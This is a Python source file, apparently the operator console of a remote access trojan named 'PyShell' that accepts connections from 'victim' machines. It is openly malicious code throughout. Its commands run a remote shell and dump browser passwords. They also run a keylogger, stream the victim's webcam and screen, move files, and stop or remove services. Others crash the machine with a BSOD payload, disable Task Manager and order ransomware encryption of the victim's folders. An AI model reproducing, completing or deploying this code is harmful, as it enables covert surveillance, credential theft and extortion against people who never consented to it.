from distutils.log import info
import socket
import os
import sys
import tkinter
from pathlib import Path
from colorama import Fore, Style
import platform
import cv2
import json
import time
import threading
from _thread import *
from tkinter import *

# global value
listen_options = {
    "LHost" : "localhost",
    "LPort" : 5000,
    "Encryption" : None,
    "Mode" : ""
}

ransome_crypto_options = {
    "File/Folder" : "folder",
    "rPath" : "C:\\Users\\user\\Desktop",
    "Type" : "fernet",
    "Action" : "encrypt",
    "Suffix" : "pyshell"
}

local_path = str(Path().absolute())
module_path = local_path + "\\bin"
import_path = local_path + "\\Scripts"
sys.path.append(module_path)
sys.path.append(import_path)

f = open('command_map.json')
command_dictionary = json.load(f)

pyshell_setting = {
    "Encode" : "Big5",
    "Encryption" : None,
    "Source" : local_path + "\\bin\\Source.txt"
}

function_path = "/"

# messagebox style value
button_ok = 0
button_ok_cancel = 1
button_abort_retry_ignore = 2
button_yes_no_cancel = 3
button_yes_no = 4
button_retry_no = 5
button_cancel_retry_continue = 6

icon_stop = 16
icon_question = 32
icon_exclimation = 48
icon_info = 64

# messagebox style table
msg_button_table = {
    "OK" : button_ok,
    "OK/Cancel" : button_ok_cancel,
    "Aboet/Retry/Ignore" : button_abort_retry_ignore,
    "Yes/No/Cancel" : button_yes_no_cancel,
    "Yes/No" : button_yes_no,
    "Retry/No" : button_retry_no,
    "Cancel/Retry/Continue" : button_cancel_retry_continue
}

msg_icon_table = {
    "Stop" : icon_stop,
    "Question" : icon_question,
    "Exclimation" : icon_exclimation,
    "Information" : icon_info
}

def os_detect():
    os = platform.system()
    return os

class ColorPrint():
    def __init__(self, text_str):
        self.text = text_str
        if os_detect() == "Windows":
            os.system("color")
    
    def error(self):
        print(f'{Fore.RED}[-]{Style.RESET_ALL} {self.text}')
        
    def worked(self):
        print(f'{Fore.LIGHTBLUE_EX}[*]{Style.RESET_ALL} {self.text}')
        
    def warning(self):
        print(f'{Fore.LIGHTYELLOW_EX}[?]{Style.RESET_ALL} {self.text}')
        
    def successed(self):
        print(f'{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} {self.text}')
    
    def question(self):
        print(f'{Fore.MAGENTA}[?]{Style.RESET_ALL} {self.text}')
        
    def print_function_path(self):
        path = ""
        for func in self.text.split('/'):
            path = path + f'{Fore.LIGHTRED_EX}{func}{Fore.LIGHTWHITE_EX}/{Style.RESET_ALL}'
        return(f'{path}{Fore.LIGHTWHITE_EX}> {Style.RESET_ALL}')

def ipInfo(addr=''):
    from urllib.request import urlopen
    from json import load
    if addr == '':
        url = 'https://ipinfo.io/json'
    else:
        url = 'https://ipinfo.io/' + addr + '/json'
    res = urlopen(url)
    #response from url(if res==None then check connection)
    data = load(res)
    #will load the json response into data
    for attr in data.keys():
        #will print the data line by line
        print(attr,' '*20+'\t->\t',data[attr])

def videoByte_decode():
    print()
    
def print_json_dict(dic):
    info_dict = json.loads(dic)
    print("==============", "================================")
    for data in info_dict:
        print("%-14s"%data, "%-15s"%info_dict[data])
    print("Done!")
    
def print_password(dic):
    info_dict = json.loads(dic)
    print("==================================================")
    for i in info_dict:
        for j in info_dict[i]:
            print("%-15s"%j, "|" ,"%-40s"%info_dict[i][j])
        print("==================================================")
    
def update(n):
    for i in range(n):
        print("i:",i,sep='',end="\r",flush=True)

        #time.sleep(1)

ev = threading.Event()
ev2 = threading.Event()
ev.set() 
ev2.set()
def loading_bar():
    while True:
        print(f'{Fore.LIGHTBLUE_EX}[*]{Style.RESET_ALL} ------Waiting ( . 3 .) ------',' /',sep='',end="\r",flush=True)
        time.sleep(0.03)
        print(f'{Fore.LIGHTBLUE_EX}[*]{Style.RESET_ALL} ------Waiting ( . 3 .) ------',' -',sep='',end="\r",flush=True)
        time.sleep(0.03)
        print(f'{Fore.LIGHTBLUE_EX}[*]{Style.RESET_ALL} ------Waiting ( . 3 .) ------',' \\',sep='',end="\r",flush=True)
        time.sleep(0.03)
        print('','',sep='',end="\r",flush=True)
        time.sleep(0.03)
        if not ev.wait(0):
            break
    
victim_session = {}
current_dict = {}

sessionid = 1
def tcp_handler(connection):
    victim_session[sessionid] = connection 

class PyShellServer():
    def __init__(self):
        self.session = {}
        self.run_keylogger = True
        while True:
            command = input(ColorPrint("PyShell").print_function_path())
            if command == "help":
                print()
            elif command == "listen":
                while True:
                    listen_command = input(ColorPrint("PyShell/listen").print_function_path()).split(' ')
                    if listen_command[0] == "help":
                        print("%-10s"%"command", "Description")
                        print("==========", "====================")
                        for i in command_dictionary:
                            print("%-10s"%i, "%-30s"%command_dictionary[i]["description"])
                    elif listen_command[0] == "options":
                        for i in listen_options:
                            print("%-12s : %-10s" % (i, listen_options[i]))
                    elif listen_command[0] == "set":
                        if listen_command[1] in listen_options:
                            listen_options[listen_command[1]] = listen_command[2] if type(listen_options[listen_command[1]]) == str else int(listen_command[2])
                            ColorPrint(f"{listen_command[1]} => {listen_command[2]}").worked()
                        else:
                            ColorPrint("Cannot find option :", listen_command[1]).error()
                    elif listen_command[0] == "run":
                        self.serverSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                        lhost = listen_options["LHost"]
                        lport = listen_options["LPort"]
                        self.lhost = lhost
                        self.lport = lport
                        break
                self.start_server()
            elif command == "builder":
                from bin.builder import Builder
                build = Builder()
            elif command == "exit":break
            else:ColorPrint("Cannot find command \"%s\", type \"help\" to know more." % command).error()
                        
    def start_server(self):
        self.serverSocket.bind((self.lhost, self.lport))
        self.serverSocket.listen(5)
        
        thread1 = threading.Thread(target=loading_bar)
        thread1.start()
        
        self.accept_connection()
        
    def accept_connection(self):
        while True:
            client_connection, client_address = self.serverSocket.accept()
            self.session[client_address] = client_connection
            ColorPrint("Connect from : %s\n" % str(client_address)).successed()
            ev.clear()
            threading.Thread(target=self.recv_send, args=(client_connection, client_address)).start()
            
            
    def recv_send(self, sock, addr):
        time.sleep(1)
        try:
            while True:
                while True:
                    remote_command = input("%s> " % str(addr)).split(' ')
                    if remote_command[0] != "exit":
                        if remote_command[0] == "shell":
                            ColorPrint("Check if shell is available...").worked()
                            ColorPrint("Shell is available").successed()
                            while True:
                                cmd_command = input("%s/Shell> " % str(addr))
                                if (cmd_command != "exit"):
                                    sock.send(b'Shell|' + cmd_command.encode())
                                    data = sock.recv(4096)
                                    if data.decode(pyshell_setting["Encode"]).split("|")[0] == "Shell":
                                        print(data.decode(pyshell_setting["Encode"]).split("|")[1])
                                        ColorPrint("Command executed").successed()
                                else:break
                        elif remote_command[0] == "info":
                            if len(remote_command) == 1:
                                sock.send(b'Info|')
                                data = sock.recv(921600)
                                try:
                                    if data.decode(pyshell_setting["Encode"]).split("|")[0] == "Info":
                                        print_json_dict(data.decode(pyshell_setting["Encode"]).split("|")[1].encode('utf-8'))
                                except:
                                    print(data.decode())
                            else:
                                if remote_command[1] == "browser":
                                    sock.send(b'Info|Browser')
                                    data = sock.recv(921600)
                                    try:
                                        if data.decode(pyshell_setting["Encode"]).split("|")[0] == "Browser":
                                            print_password(data.decode(pyshell_setting["Encode"]).split("|")[1].encode('utf-8'))
                                    except:
                                        print("Error")
                                        print(data.decode())
                        elif remote_command[0] == "keylogger":
                            try:
                                if remote_command[1] == "start":
                                    sock.send(b"Keylogger|Start")
                                    self.run_keylogger = True
                                    threading.Thread(target=self.keylogger, args=(sock, addr)).start()
                                elif remote_command[1] == "stop":
                                    ColorPrint("Stop the keylogger").worked()
                                    time.sleep(5)
                                    self.run_keylogger = False
                                    ev.clear()
                                    sock.send(b"Keylogger|Stop")
                            except:
                                ColorPrint("Command error.....please type \"help\"").error()
                        elif remote_command[0] == "chat":
                            server_name = input("Enter your name : ")
                            victim_name = input("Enter victim name : ")
                            sock.send(b'Chat|GoChat')
                            while True:
                                chat_text = input("%s : " % server_name)
                                sock.send(b'Chat|ChatText' + chat_text.encode())
                        elif remote_command[0] == "manager":
                            while True:
                                manager_command = input(ColorPrint("%s/manager"% str(addr)).print_function_path()).split(" ")
                                if manager_command[0] == "port":
                                    if manager_command[1] == "list":
                                        sock.send(b"Port|List")
                                        print_json_dict(sock.recv(4096).decode())
                                    elif manager_command[1] == "open":
                                        print("open", manager_command[1])
                                    elif manager_command[1] == "close":
                                        print("close", manager_command[1])
                                    elif manager_command[1] == "exit":
                                        break
                                elif manager_command[0] == "file":
                                    if len(manager_command) == 1:
                                        while True:
                                            file_command = input(ColorPrint("%s/manager/file"% str(addr)).print_function_path()).split(" ")
                                            if file_command[0] == "list":
                                                sock.send(b"Manager|File|List")
                                                print_json_dict(sock.recv(1024576))
                                            elif file_command[0] == "download":
                                                ColorPrint("Downloading.....").worked()
                                                remote_path = file_command[1]
                                                local_path = file_command[2]
                                                sock.send(b'Manager|File|Download|' + remote_path.encode())
                                                f = open(local_path, 'wb')
                                                f_data = sock.recv(1024)
                                                while (f_data):
                                                    f.write(f_data)
                                                    f_data = sock.recv(1024)
                                                    try:
                                                        if f_data.decode() == "Done":
                                                            f.close()
                                                            break
                                                    except:
                                                        pass
                                                ColorPrint("Finished").successed()
                                            elif file_command[0] == "upload":
                                                local_path = file_command[1]
                                                remote_path = file_command[2]
                                                sock.send(b'Manager|File|Upload|' + remote_path.encode())
                                                fp = open(local_path, 'rb')
                                                f_data = fp.read(1024)
                                                while f_data:
                                                    sock.send(f_data)
                                                    f_data = fp.read(1024)
                                                    if not f_data:
                                                        break
                                                fp.close()
                                                sock.send(b"Done")
                                                ColorPrint("The file has been uploaded").successed()
                                            elif file_command[0] == "help":
                                                for i in command_dictionary["controled"]["manager"]["command"]["file"]["command"]:
                                                    ColorPrint(i + " : " + command_dictionary["controled"]["manager"]["command"]["file"]["command"][i]["info"]).question()
                                            elif file_command[0] == "exit":
                                                break
                                    elif manager_command[1] == "help":
                                        print("help")
                                elif manager_command[0] == "service":
                                    try:
                                        if manager_command[1] == "list":
                                            sock.send(b"Manager|Services|List")
                                            print_json_dict(sock.recv(965000).decode())
                                        elif manager_command[1] == "start":
                                            sock.send(f"Manager|Services|Start|{manager_command[2]}".encode('utf-8'))
                                        elif manager_command[1] == "stop":
                                            sock.send(f"Manager|Services|Stop|{manager_command[2]}".encode('utf-8'))
                                        elif manager_command[1] == "restart":
                                            sock.send(f"Manager|Services|Restart|{manager_command[2]}".encode('utf-8'))
                                        elif manager_command[1] == "remove":
                                            sock.send(f"Manager|Services|Remove|{manager_command[2]}".encode('utf-8'))
                                        elif manager_command[1] == "help":
                                            print()
                                        else:ColorPrint(f"Unknown command {manager_command[1]}").error()
                                    except IndexError:
                                        ColorPrint("Command error.....please type \"help\"").error()
                                elif manager_command[0] == "registry":
                                    pass
                                elif manager_command[0] == "exit":
                                    break
                        elif remote_command[0] == "webcam":
                            try:
                                sock.send(b'Webcam|')
                                video_byte = sock.recv(921600)
                                cv2.namedWindow("server")
                                vc = cv2.VideoCapture(0)
                                import numpy as np
                                data = np.frombuffer(video_byte, dtype='uint8')
                                decimg = cv2.imdecode(data, 1)
                            except:pass
                            while True:
                                try:
                                    video_byte = sock.recv(921600)
                                    
                                    #data_encode = np.array(video_byte)
                                    #str_encode = data_encode.tostring()
                                    #nparray = np.fromstring(str_encode, np.uint8)
                                    #img_decode = cv2.imdecode(nparray, cv2.IMREAD_COLOR)
                                    #frame = img_decode
                                    
                                    data = np.frombuffer(video_byte, dtype='uint8')
                                    decimg = cv2.imdecode(data, 1)
                                    
                                    
                                    cv2.imshow("server", decimg)
                                except:continue
                                key = cv2.waitKey(20)
                                try:
                                    if key == 27: # exit on ESC
                                        sock.send(b'Webcam|Stop')
                                        print("DONE!")
                                        time.sleep(5)
                                        #buf = sock.recv(965000)
                                        cv2.destroyAllWindows()
                                        break
                                    #buf = sock.recv(921600)
                                except:break #buffer
                            vc.release()
                        elif remote_command[0] == "screenshot":
                            import msvcrt
                            sock.send(b"ScreenShot|Start")
                            video_byte = sock.recv(921600)
                            cv2.namedWindow("server")
                            vc = cv2.VideoCapture(0)
                            import numpy as np
                            data_encode = np.array(video_byte)
                            str_encode = data_encode.tostring()
                            nparray = np.fromstring(str_encode, np.uint8)
                            img_decode = cv2.imdecode(nparray, cv2.IMREAD_COLOR)
                            frame = img_decode
                            while True:
                                try:
                                    video_byte = sock.recv(921600)
                                    data_encode = np.array(video_byte)
                                    str_encode = data_encode.tostring()
                                    nparray = np.fromstring(str_encode, np.uint8)
                                    img_decode = cv2.imdecode(nparray, cv2.IMREAD_COLOR)
                                    frame = img_decode
                                    cv2.imshow("server", frame)
                                except:continue
                                
                                key = cv2.waitKey(20)
                                if key == 27: # exit on ESC
                                    sock.send(b'Webcam|Stop')
                                    response = sock.recv(1024).decode()
                                    if response == "OK":
                                        print("DONE!")
                                    break
                            vc.release()
                            cv2.destroyWindow("server")
                        elif remote_command[0] == "funstuff":
                            while True:
                                fun_command = input(ColorPrint("%s/funstuff"% str(addr)).print_function_path()).split(" ")
                                if fun_command[0] == "msgbox":
                                    while True:
                                        msg_command = input(ColorPrint("%s/funstuff/MsgBox"% str(addr)).print_function_path())
                                        if msg_command != "":
                                            if msg_command != "help" and msg_command != "exit":
                                                try:
                                                    msg_data = msg_command.split(",")
                                                    # title | text | button | icon
                                                    sock.send(f"MsgBox|{msg_data[0]}|{msg_data[1]}|{msg_data[2]}|{msg_data[3]}".encode('utf-8'))
                                                except IndexError:
                                                    ColorPrint(f"Example: " + command_dictionary["controled"]["funstuff"]["command"]["msgbox"]["example"]).question()
                                            elif msg_command == "exit":
                                                break
                                            else:
                                                ColorPrint(f"Example:" + command_dictionary["controled"]["funstuff"]["command"]["msgbox"]["info"]).question()
                                                ColorPrint(f"Example:" + command_dictionary["controled"]["funstuff"]["command"]["msgbox"]["example"]).question()
                                                ColorPrint("And the follow table is the integer value of style").question()
                                                print("\t==========Button Style==========")
                                                for i in msg_button_table:
                                                    print("\t%-21s :"%i,msg_button_table[i])
                                                print("\t===========Icon Style===========")
                                                for i in msg_icon_table:
                                                    print("\t%-21s :"%i,msg_icon_table[i])
                                                print()
                                        else:
                                            sock.send(f"MsgBox|Hello world|I am sorry...I don't work for you anymore...|1|1".encode('utf-8'))
                                elif fun_command[0] == "drive":
                                    try:
                                        if fun_command[1] == "open":
                                            sock.send(b"CdDrive|Open")
                                        elif fun_command[1] == "close":
                                            sock.send(b"CdDrive|Close")
                                        elif fun_command[1] == "lock":
                                            print()
                                        elif fun_command[1] == "unlock":
                                            print()
                                        elif fun_command[1] == "help":
                                            ColorPrint("Example : " + command_dictionary["controled"]["funstuff"]["command"]["drive"]["info"]).question()
                                            for i in command_dictionary["controled"]["funstuff"]["command"]["drive"]["command"]:
                                                print(i, ":", command_dictionary["controled"]["funstuff"]["command"]["drive"]["command"][i])
                                    except IndexError:
                                        ColorPrint("Command error.....please type \"help\"").error()
                                elif fun_command[0] == "taskbar":
                                    try:
                                        if fun_command[1] == "hide":
                                            sock.send(b"Taskbar|Hide")
                                        elif fun_command[1] == "show":
                                            sock.send(b"Taskbar|Show")
                                        elif fun_command[1] == "help":
                                            for i in command_dictionary["controled"]["funstuff"]["command"]["taskbar"]["command"]:
                                                print(i, ":", command_dictionary["controled"]["funstuff"]["command"]["taskbar"]["command"][i])
                                    except IndexError:
                                        ColorPrint("Command error.....please type \"help\"").error()
                                elif fun_command[0] == "startorb":
                                    try:
                                        if fun_command[1] == "hide":
                                            sock.send(b"StartOrb|Hide")
                                        elif fun_command[1] == "show":
                                            sock.send(b"StartOrb|Show")
                                        elif fun_command[1] == "help":
                                            for i in command_dictionary["controled"]["funstuff"]["command"]["startorb"]["command"]:
                                                print(i, ":", command_dictionary["controled"]["funstuff"]["command"]["startorb"]["command"][i])
                                    except IndexError:
                                        ColorPrint("Command error.....please type \"help\"").error()
                                elif fun_command[0] == "clock":
                                    try:
                                        if fun_command[1] == "hide":
                                            sock.send(b"WinClock|Hide")
                                        elif fun_command[1] == "show":
                                            sock.send(b"WinClock|Show")
                                        elif fun_command[1] == "help":
                                            for i in command_dictionary["controled"]["funstuff"]["command"]["clock"]["command"]:
                                                print(i, ":", command_dictionary["controled"]["funstuff"]["command"]["clock"]["command"][i])
                                    except IndexError:
                                        ColorPrint("Command error.....please type \"help\"").error()
                                elif fun_command[0] == "mouse":
                                    try:
                                        if fun_command[1] == "lock":
                                            sock.send(b"Mouse|Lock")
                                        elif fun_command[1] == "unlock":
                                            sock.send(b"Mouse|UnLock")
                                        elif fun_command[1] == "help":
                                            for i in command_dictionary["controled"]["funstuff"]["command"]["mouse"]["command"]:
                                                print(i, ":", command_dictionary["controled"]["funstuff"]["command"]["mouse"]["command"][i])
                                    except IndexError:
                                        ColorPrint("Command error.....please type \"help\"").error()
                                elif fun_command[0] == "taskmanager":
                                    try:
                                        if fun_command[1] == "disable":
                                            sock.send(b"TaskManager|Disable")
                                        elif fun_command[1] == "enable":
                                            sock.send(b"TaskManager|Enable")
                                    except IndexError:
                                        ColorPrint("Command error.....please type \"help\"").error()
                                elif fun_command[0] == "crash":
                                    import bin.payload as payload
                                    sock.send(payload.bsod_payload().encode('utf-8'))
                                elif fun_command[0] == "help":
                                    ColorPrint("[Command] help ").worked()
                                elif fun_command[0] == "exit": break
                                else:ColorPrint("Unknown command...").error()
                        elif remote_command[0] == "ransome":
                            while True:
                                ran_command = input("Ransome/> ").split(' ')
                                if ran_command[0] == "options":
                                    for i in ransome_crypto_options:
                                        print("%-12s : %-10s" % (i, ransome_crypto_options[i]))
                                elif ran_command[0] == "set":
                                    if ran_command[1] in ransome_crypto_options:
                                        ransome_crypto_options[ran_command[1]] = ran_command[2] if type(ransome_crypto_options[ran_command[1]]) == str else int(ran_command[2])
                                        ColorPrint(f"{ran_command[1]} => {ran_command[2]}").worked()
                                    else:
                                        ColorPrint("Cannot find option :", ran_command[1]).error()
                                elif ran_command[0] == "run":
                                    if ransome_crypto_options["File/Folder"] == "folder":
                                        if ransome_crypto_options["Action"] == "encrypt":
                                            comm = "Ransome|Encrypt|Folder|%s" % ransome_crypto_options["rPath"]
                                            sock.send(comm.encode('utf-8'))
                                        elif ransome_crypto_options["Action"] == "decrypt":
                                            comm = "Ransome|Decrypt|Folder|%s" % ransome_crypto_options["rPath"]
                                            sock.send(comm.encode('utf-8'))
                                    elif ransome_crypto_options["File/Folder"] == "file":
                                        if ransome_crypto_options["Action"] == "encrypt":
                                            comm = "Ransome|Encrypt|File|%s" % ransome_crypto_options["rPath"]
                                            sock.send()
                                            sock.send(comm.encode('utf-8'))
                                        elif ransome_crypto_options["Action"] == "decrypt":
                                            comm = "Ransome|Decrypt|File|%s" % ransome_crypto_options["rPath"]
                                            sock.send(comm.encode('utf-8'))
                                elif ran_command[0] == "exit":
                                    break
                                else:ColorPrint("Unknown command").error()
                        elif remote_command[0] == "help":
                            ColorPrint("[Command] help ").worked()
                        else:
                            ColorPrint("Unknown command...").error()
                    else:
                        break
                global new_socket
                for client in self.session.values():
                    print("available session : ", client)
                    new_socket = client
                session = input("client : ")
                sock = new_socket
        except ConnectionResetError:
            print("An victim has been off line!")
            
    def keylogger(self, sock, addr):
        try:
            while True:
                if self.run_keylogger == True:
                    kdata = sock.recv(965000).decode('utf-8').split("|")
                    if kdata[0] == "KeyLogger":
                        f = open("keylogger.txt", 'a')
                        f.write(kdata[1])
                        f.close()
                        time.sleep(0.1)
                        if not ev2.wait(0):
                            break
                else:
                    ColorPrint("The keylogger has been stoppped").successed()
                    break
        except OSError:
            pass
                
    def close_server(self):
        for client in self.session.values():
            client.close()
        self.serverSocket.close()
        os._exit(0)
        
if __name__ == '__main__':
    os.system("title PyShell")
    ColorPrint("Initialize....").worked()
    logo_path = local_path + "\\Picture"
    logo_list = os.listdir(logo_path)
    import random
    logo = str(logo_path)+ "\\" + logo_list[random.randrange(0, len(logo_list))]
    f = open(logo, 'r')
    lines = f.readlines()
    try:
        for i in lines:
            print(eval(i))
        f.close()
    except:
        os.system(f"python {logo}")
    ColorPrint("Welcome ( . 3 .)").successed()
    server = PyShellServer()